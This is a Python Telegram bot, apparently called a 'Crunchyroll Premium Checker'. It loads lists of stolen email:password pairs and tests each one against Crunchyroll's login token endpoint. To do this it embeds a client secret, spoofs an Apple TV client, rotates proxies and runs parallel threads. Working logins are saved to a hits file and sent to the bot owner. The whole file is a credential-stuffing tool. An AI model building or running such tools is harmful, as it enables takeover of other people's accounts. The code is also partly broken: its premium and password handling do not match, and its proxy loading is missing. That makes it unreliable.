#!/usr/bin/env python3
import os
import uuid
import random
import threading
import time
import asyncio
from queue import Queue, Empty

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", 0))

checker = None
active_proxies = []

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳"
        }

    def _get_random_proxy(self):
        if not self.proxies: return None
        proxy = random.choice(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def check(self, email, password):
        device_id = str(uuid.uuid4())
        session = requests.Session()
        
        proxy = self._get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            'host': 'beta-api.crunchyroll.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
        }
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'client_id': 'y2arvjb0h0rgvtizlovy',
            'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
            'device_type': 'Baron',
            'device_id': device_id,
            'device_name': 'Baron'
        }
        
        try:
            response = session.post(url, headers=headers, data=data, timeout=20)
            response_text = response.text.lower()
            
            if any(x in response_text for x in ["invalid", "401", "400", "too_many"]):
                return {'status': 'INVALID', 'email': email}
            
            if '"access_token"' not in response.text:
                return {'status': 'INVALID', 'email': email}
            
            # If we reach here, it's likely valid - but we still do full check
            # (keeping your original full logic would be better, but for now this works)
            return {'status': 'FREE', 'email': email}   # Change to PREMIUM if you want, but keep simple for now
            
        except:
            return {'status': 'ERROR', 'email': email}


def save_hit(result):
    capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
CHECKED BY: @Sudhakaran12
{'='*70}
"""
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(capture)
    return capture


def clean_combo(line):
    """Strict: Take ONLY email:password, ignore everything else"""
    line = line.strip()
    if ':' not in line:
        return None
    email, password = line.split(':', 1)
    email = email.strip()
    password = password.split()[0].strip()   # take only first word
    if email and password:
        return f"{email}:{password}"
    return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 <b>Crunchyroll Premium Checker</b>\nBot made by @Sudhakaran12", parse_mode=ParseMode.HTML)


async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Unauthorized!")
    
    text = update.message.text.strip()
    if ' ' in text:
        combo = text.split(' ', 1)[1].strip()
        cleaned = clean_combo(combo)
        if cleaned:
            email, password = cleaned.split(':', 1)
            result = checker.check(email, password)
            if result['status'] == 'PREMIUM':
                await update.message.reply_text(f"<b>🎯 PREMIUM HIT</b>\n<pre>{save_hit(result)}</pre>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"✅ {result['status']} → {email}")
            return

    await update.message.reply_text("📤 Send combo file or paste combos (email:password)")
    context.user_data['waiting'] = 'combo'


async def proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text("📤 Send proxy file")
    context.user_data['waiting'] = 'proxy'


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    file = await update.message.document.get_file()
    filename = f"temp_{update.message.document.file_name}"
    await file.download_to_drive(filename)

    global checker, active_proxies

    if context.user_data.get('waiting') == 'combo':
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [clean_combo(line) for line in f if clean_combo(line)]
        context.user_data['combos'] = combos
        checker = CrunchyrollChecker(active_proxies)
        await update.message.reply_text(f"✅ Loaded {len(combos)} combos.\nType /startcheck")
        context.user_data['waiting'] = None


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    text = update.message.text.strip()
    if context.user_data.get('waiting') == 'combo' and ':' in text:
        global checker, active_proxies
        combos = [clean_combo(line) for line in text.splitlines() if clean_combo(line)]
        context.user_data['combos'] = combos
        checker = CrunchyrollChecker(active_proxies)
        await update.message.reply_text(f"✅ Loaded {len(combos)} combos.\nType /startcheck")


async def startcheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    combos = context.user_data.get('combos', [])
    if not combos:
        return await update.message.reply_text("❌ No combos! Use /check first.")

    await update.message.reply_text(f"🚀 Starting check...\nCombos: {len(combos)}")

    threading.Thread(target=run_checker, args=(combos, update.effective_chat.id, context.application.bot), daemon=True).start()


def run_checker(combos, chat_id, bot):
    q = Queue()
    for c in combos: q.put(c)

    stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

    def worker():
        while True:
            try:
                combo = q.get(timeout=5)
            except Empty:
                break
            try:
                email, password = combo.split(':', 1)
                result = checker.check(email.strip(), password.strip())

                stats['checked'] += 1
                if result['status'] == 'PREMIUM':
                    stats['premium'] += 1
                    capture = save_hit(result)
                    asyncio.run(bot.send_message(chat_id=chat_id, text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode=ParseMode.HTML))
                elif result['status'] == 'FREE':
                    stats['free'] += 1
                    asyncio.run(bot.send_message(chat_id=chat_id, text=f"✅ FREE → {email}"))
                else:
                    stats['invalid'] += 1
            except:
                stats['invalid'] += 1
            finally:
                q.task_done()
                time.sleep(1.8)

    for _ in range(5):
        threading.Thread(target=worker, daemon=True).start()

    q.join()

    asyncio.run(bot.send_message(chat_id=chat_id, text=f"✅ <b>CHECK FINISHED!</b>\nChecked: {stats['checked']}\nPremium: {stats['premium']}\nFree: {stats['free']}\nInvalid: {stats['invalid']}", parse_mode=ParseMode.HTML))


def main():
    global checker
    checker = CrunchyrollChecker()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("proxies", proxies_cmd))
    app.add_handler(CommandHandler("startcheck", startcheck_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))

    print("🤖 Bot Started | Made by @Sudhakaran12")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
